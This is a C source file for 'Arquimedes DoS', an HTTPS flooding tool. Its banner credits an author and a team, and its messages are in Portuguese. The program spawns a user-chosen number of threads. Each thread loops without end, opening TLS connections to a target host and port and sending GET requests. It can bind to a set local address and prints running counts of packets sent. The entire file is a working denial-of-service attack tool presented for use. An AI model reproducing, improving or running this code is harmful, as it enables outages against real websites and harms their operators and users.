#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

char *target_host = "example.com";
int target_port = 443;
int threads = 50;
char *local_ip = NULL;
int local_port = 0;

void* flood(void* arg) {
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    int packet_count = 0;

    while (1) {
        struct hostent *host = gethostbyname(target_host);
        if (!host) continue;

        struct sockaddr_in addr;
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        if (local_ip != NULL && local_port != 0) {
            struct sockaddr_in local_addr;
            local_addr.sin_family = AF_INET;
            local_addr.sin_port = htons(local_port);
            local_addr.sin_addr.s_addr = inet_addr(local_ip);
            bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr));
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_port);
        addr.sin_addr = *((struct in_addr*) host->h_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) != -1) {
            char req[1024];
            snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", target_host);
            SSL_write(ssl, req, strlen(req));
            packet_count++;
            printf("Arquimedes-Dos -> %d pacote%s enviado%s para %s!\n", 
                   packet_count, 
                   packet_count == 1 ? "" : "s",
                   packet_count == 1 ? "" : "s",
                   target_host);
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
    }

    SSL_CTX_free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Uso: ./arquimedes -I <host> -p <porta> -t <threads> [-l <ip_local> -lp <porta_local>]\n");
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-I") == 0) {
            target_host = argv[i + 1];
        }
        if (strcmp(argv[i], "-p") == 0) {
            target_port = atoi(argv[i + 1]);
        }
        if (strcmp(argv[i], "-t") == 0) {
            threads = atoi(argv[i + 1]);
        }
        if (strcmp(argv[i], "-l") == 0) {
            local_ip = argv[i + 1];
        }
        if (strcmp(argv[i], "-lp") == 0) {
            local_port = atoi(argv[i + 1]);
        }
    }

    printf("\nAtaque iniciado!\n\n");
    printf("🪓 By - Jhon Lamdenberguer\n");
    printf("💻 Team - Família Flodder Techno\n");
    printf("📱 Ferramenta - Arquimedes DoS\n\n");

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, NULL);
        usleep(10000);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
